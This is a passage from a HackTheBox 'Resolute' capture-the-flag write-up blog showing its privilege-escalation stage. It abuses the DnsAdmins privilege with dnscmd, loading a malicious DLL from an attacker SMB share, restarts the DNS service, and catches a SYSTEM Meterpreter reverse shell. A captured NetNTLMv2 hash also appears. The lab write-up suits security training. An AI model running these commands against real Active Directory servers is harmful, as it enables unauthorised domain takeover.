(10.10.10.169,59760)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)</span><br><span class="line">[*] User RESOLUTE\RESOLUTE$ authenticated successfully</span><br><span class="line">[*] RESOLUTE$::MEGABANK:4141414141414141:6bf4545d80d2f13607b0c9d3f91bd604:010100000000000080adb2044837d601ec836f15824f4098000000000100100078005700710051006a0067004a004f000300100078005700710051006a0067004a004f00020010006b00540075006600480053004f006c00040010006b00540075006600480053004f006c000700080080adb2044837d60106000400020000000800300030000000000000000000000000400000318efa794fd558b74c119e534800bb85deca03c294098a118af41f41a36559c40a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100380037000000000000000000</span><br><span class="line">[*] Disconnecting Share(1:SHARE)</span><br><span class="line">[*] Handle: <span class="string">'ConnectionResetError'</span> object is not subscriptable</span><br><span class="line">[*] Closing down connection (10.10.10.169,59760)</span><br><span class="line">[*] Remaining connections []</span><br></pre></td></tr></table></figure>


<p>Now let’s run <code>metasploit</code> with <code>meterpreter</code> sessions and start listening .</p>
<h3 id="Setup-Meterpreter-session"><a href="#Setup-Meterpreter-session" class="headerlink" title="Setup Meterpreter session"></a>Setup Meterpreter session</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute </span><br><span class="line">❯ msfconsole</span><br><span class="line">[!] The following modules could not be loaded!../</span><br><span class="line">[!]     /root/.msf4/modules/exploits/cgi/webapps/wordpress_userpro.rb</span><br><span class="line">[!] Please see /root/.msf4/logs/framework.log <span class="keyword">for</span> details.</span><br><span class="line">                                                  </span><br><span class="line">               .;lxO0KXXXK0Oxl:.</span><br><span class="line">           ,o0WMMMMMMMMMMMMMMMMMMKd,</span><br><span class="line">        <span class="string">'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,</span></span><br><span class="line"><span class="string">      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:</span></span><br><span class="line"><span class="string">    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,</span></span><br><span class="line"><span class="string">   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo</span></span><br><span class="line"><span class="string">  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk</span></span><br><span class="line"><span class="string"> oMMMMMMMMMMx.                    dMMMMMMMMMMx</span></span><br><span class="line"><span class="string">.WMMMMMMMMM:                       :MMMMMMMMMM,</span></span><br><span class="line"><span class="string">xMMMMMMMMMo                         lMMMMMMMMMO</span></span><br><span class="line"><span class="string">NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;</span></span><br><span class="line"><span class="string">MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:</span></span><br><span class="line"><span class="string">NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:</span></span><br><span class="line"><span class="string">xMMMMMMMMMd                        ,0MMMMMMMMMMK;</span></span><br><span class="line"><span class="string">.WMMMMMMMMMc                         '</span>OMMMMMM0,</span><br><span class="line"> lMMMMMMMMMMk.                         .kMMO<span class="string">'</span></span><br><span class="line"><span class="string">  dMMMMMMMMMMWd'</span>                         ..</span><br><span class="line">   cWMMMMMMMMMMMNxc<span class="string">'.                ##########</span></span><br><span class="line"><span class="string">    .0MMMMMMMMMMMMMMMMWc            #+#    #+#</span></span><br><span class="line"><span class="string">      ;0MMMMMMMMMMMMMMMo.          +:+</span></span><br><span class="line"><span class="string">        .dNMMMMMMMMMMMMo          +#++:++#+</span></span><br><span class="line"><span class="string">           '</span>oOWMMMMMMMMo                +:+</span><br><span class="line">               .,cdkO0K;        :+:    :+:                                </span><br><span class="line">                                :::::::+:</span><br><span class="line">                      Metasploit</span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.87-dev                          ]</span><br><span class="line">+ -- --=[ 2006 exploits - 1096 auxiliary - 343 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: When <span class="keyword">in</span> a module, use back to go back to the top level prompt</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/handler                                                                                                                                                          </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 10.10.14.187</span><br><span class="line">LHOST =&gt; 10.10.14.187                                                                                                                                                                     </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 9001</span><br><span class="line">LPORT =&gt; 9001                                                                                                                                                                             </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp                                                                                                                                            </span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.187:9001</span><br></pre></td></tr></table></figure>

<p>all things now are setup. so now I will do the exploitation’ i will load again my <code>dll</code> file.</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dnscmd /config /serverlevelplugindll \\<span class="number">10.10</span><span class="number">.14</span><span class="number">.187</span>\SHARE\main.dll</span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure>

<p>so based on the <code>article</code> I will stop and start the <code>dns</code> services, this will invoke my <code>dll</code> file and captured <code>meterpreter</code> shell.</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; sc.exe stop dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        TYPE               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : <span class="number">3</span>  STOP_PENDING</span><br><span class="line">                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0x0</span>)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0x0</span>)</span><br><span class="line">        CHECKPOINT         : <span class="number">0x0</span></span><br><span class="line">        WAIT_HINT          : <span class="number">0x0</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure>

<p>then start <code>dns</code> service</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; sc.exe start dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        TYPE               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : <span class="number">2</span>  START_PENDING</span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : <span class="number">0</span>  (<span class="number">0x0</span>)</span><br><span class="line">        SERVICE_EXIT_CODE  : <span class="number">0</span>  (<span class="number">0x0</span>)</span><br><span class="line">        CHECKPOINT         : <span class="number">0x0</span></span><br><span class="line">        WAIT_HINT          : <span class="number">0x7d0</span></span><br><span class="line">        PID                : <span class="number">1144</span></span><br><span class="line">        FLAGS              :</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure>

<p>and finally got a Administrator shell !</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.187:9001 </span><br><span class="line">[*] Sending stage (201283 bytes) to 10.10.10.169</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.187:9001 -&gt; 10.10.10.169:59761) at 2020-05-31 20:35:54 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : RESOLUTE</span><br><span class="line">OS              : Windows 2016+ (10.0 Build 14393).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : en_US</span><br><span class="line">Domain          : MEGABANK</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h3 id="Get-the-root-txt"><a href="#Get-the-root-txt" class="headerlink" title="Get the root.txt"></a>Get the root.txt</h3><p>So let’s pop up a shell and get the <code>root.txt</code> :</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process <span class="number">1596</span> created.</span><br><span class="line">Channel <span class="number">1</span> created.</span><br><span class="line">Microsoft Windows [Version <span class="number">10.0</span><span class="number">.14393</span>]</span><br><span class="line">(c) <span class="number">2016</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">C:\Users&gt;cd Administrator/Desktop</span><br><span class="line">cd Administrator/Desktop</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number <span class="keyword">is</span> <span class="number">923F</span><span class="number">-3611</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"><span class="number">12</span>/<span class="number">04</span>/<span class="number">2019</span>  <span class="number">06</span>:<span class="number">18</span> AM    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">12</span>/<span class="number">04</span>/<span class="number">2019</span>  <span class="number">06</span>:<span class="number">18</span> AM    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">12</span>/<span class="number">03</span>/<span class="number">2019</span>  <span class="number">08</span>:<span class="number">32</span> AM                <span class="number">32</span> root.txt</span><br><span class="line">               <span class="number">1</span> File(s)             <span class="number">32</span> bytes</span><br><span class="line">               <span class="number">2</span> Dir(s)  <span class="number">30</span>,<span class="number">837</span>,<span class="number">903</span>,<span class="number">360</span> bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;Get-Content <span class="string">"root.txt"</span> | Measure-Object -Character -Word    </span><br><span class="line">Get-Content <span class="string">"root.txt"</span> | Measure-Object -Character -Word</span><br><span class="line"><span class="string">'Get-Content'</span> <span class="keyword">is</span> not recognized <span class="keyword">as</span> an <span class="keyword">internal</span> or external command,</span><br><span class="line">operable program or batch file.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;powershell</span><br><span class="line">powershell</span><br><span class="line">Windows PowerShell </span><br><span class="line">Copyright (C) <span class="number">2016</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Users\Administrator\Desktop&gt; Get-Content <span class="string">"root.txt"</span> | Measure-Object -Character -Word</span><br><span class="line">Get-Content <span class="string">"root.txt"</span> | Measure-Object -Character -Word</span><br><span class="line"></span><br><span class="line">Lines Words Characters Property</span><br><span class="line">----- ----- ---------- --------</span><br><span class="line">          <span class="number">1</span>         <span class="number">32</span>         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure>

<hr>
<p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p>
<p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p>
<hr>
<p>Referrences:</p>
<p><a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html" target="_blank" rel="noopener">Abusing DNSAdmins privilege for escalation in Active Directory</a></p>
<p><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise" target="_blank" rel="noopener">From DnsAdmins to SYSTEM to Domain Compromise</a></p>
<p><a href="https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb" target="_blank" rel="noopener">Transferring Files from Linux to Windows (post-exploitation)</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/projects/">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum4linux"><span class="toc-number">4.1.</span> <span class="toc-text">Enum4linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post - Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Evil-WinRM"><span class="toc-number">5.1.</span> <span class="toc-text">Evil-WinRM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Transfer-file-with-SAMBA"><span class="toc-number">6.1.</span> <span class="toc-text">Transfer file with SAMBA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hidden-directories"><span class="toc-number">6.2.</span> <span class="toc-text">Hidden directories</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-DNSAdmins-privilege-for-escalation-in-Active-Directory"><span class="toc-number">7.1.</span> <span class="toc-text">Abusing DNSAdmins privilege for escalation in Active Directory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-malicious-DLL"><span class="toc-number">7.2.</span> <span class="toc-text">Creating malicious DLL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Setup-Impacket-smbserver"><span class="toc-number">7.3.</span> <span class="toc-text">Setup Impacket-smbserver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Setup-Meterpreter-session"><span class="toc-number">7.4.</span> <span class="toc-text">Setup Meterpreter session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-the-root-txt"><span class="toc-number">7.5.</span> <span class="toc-text">Get the root.txt</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&text=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&title=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&is_video=false&description=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox - Resolute&body=Check out this article: https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&title=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&title=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&title=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&title=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&name=HackTheBox - Resolute&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&t=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    InfoSec &#64; medz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/projects/">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
